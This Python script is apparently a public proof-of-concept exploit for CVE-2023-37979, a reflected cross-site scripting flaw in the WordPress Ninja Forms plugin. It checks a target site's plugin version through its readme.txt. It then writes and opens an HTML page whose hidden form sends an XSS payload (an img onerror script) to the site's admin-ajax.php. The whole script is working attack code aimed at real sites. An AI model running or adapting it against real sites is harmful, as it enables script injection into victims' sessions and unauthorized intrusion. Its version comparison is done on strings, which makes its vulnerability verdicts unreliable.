from argparse import ArgumentParser
from os import getcwd, path
from re import search
import sys
import webbrowser
from time import sleep
from requests import get, RequestException

# Constants
CVE_NAME = "CVE-2023-37979"
VULNERABLE_VERSION = "3.6.25"
HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"}

def generate_exploit_html(target_url):
    html_template = f"""<!DOCTYPE html>
<!-- Created By Mehran Seifalinia -->
<html>
<head>
  <title>{CVE_NAME}</title>
  <style>
    body {{ font-family: Arial, sans-serif; background-color: #f7f7f7; color: #333; margin: 0; padding: 0; }}
    header {{ background-color: #4CAF50; padding: 10px; text-align: center; color: white; font-size: 24px; }}
    .cool-button {{ background-color: #007bff; color: white; padding: 10px 20px; border: none; cursor: pointer; font-size: 16px; border-radius: 4px; }}
    .cool-button:hover {{ background-color: #0056b3; }}
  </style>
</head>
<body>
  <header>Ninja-forms reflected XSS ({CVE_NAME})</header>
  <div style="padding: 20px;">
    <form action="{target_url}/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="action" value="nf_batch_process" />
      <input type="hidden" name="batch_type" value="import_form_template" />
      <input type="hidden" name="security" value="e29f2d8dca" />
      <input type="hidden" name="extraData[template]" value="formtemplate-contactformd" />
      <input type="hidden" name="method_override" value="_respond" />
      <input type="hidden" name="data" value="Mehran&quot;}}<img src=Seifalinia onerror=alert('XSS by Mehran')>" />
      <input type="submit" class="cool-button" value="Click here to Execute XSS" />
    </form>
  </div>
  <div style="background-color:red;color:white;padding:1%;">If you received a 0 or an empty page, login may be required.</div>
  <footer><a href="https://github.com/Mehran-Seifalinia">Github</a></footer>
</body>
</html>
"""
    file_path = path.join(getcwd(), f"{CVE_NAME}.html")
    with open(file_path, "w") as poc:
        poc.write(html_template)
    print(f"[@] POC Generated at {file_path}")
    sleep(2)
    webbrowser.open(file_path)

def check_vulnerability(target_url):
    try:
        response = get(f"{target_url}/wp-content/plugins/ninja-forms/readme.txt", headers=HEADERS)
        if response.status_code != 200 or "Ninja Forms" not in response.text:
            print("[!] Ninja-forms plugin is not installed on this site.")
            return False

        match = search(r"Stable tag:\s*([\d.]+)", response.text)
        if not match:
            print("[!] Unable to determine the plugin version.")
            return False

        version = match.group(1)
        print(f"[*] Detected Ninja-forms version: {version}")

        if version <= VULNERABLE_VERSION:
            print(f"[+] This version ({version}) is vulnerable!")
            return True
        else:
            print(f"[-] This version ({version}) is NOT vulnerable.")
            return False
    except RequestException as error:
        print(f"[!] HTTP Request Error: {error}")
        sys.exit(1)

def main():
    parser = ArgumentParser(description=f"{CVE_NAME} Exploit Script")
    parser.add_argument("target", help="Target URL (e.g., https://vulnsite.com)")
    parser.add_argument("--exploit", action="store_true", help="Generate and open PoC HTML file")
    args = parser.parse_args()

    target_url = args.target.rstrip("/")

    if not target_url.startswith(("http://", "https://")):
        print("[!] Invalid target: The URL must start with 'http://' or 'https://'.")
        sys.exit(1)

    print("[*] Checking the target for vulnerability...")
    if check_vulnerability(target_url):
        if args.exploit:
            generate_exploit_html(target_url)
        else:
            print("[*] Run with '--exploit' to generate and execute the PoC.")
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()
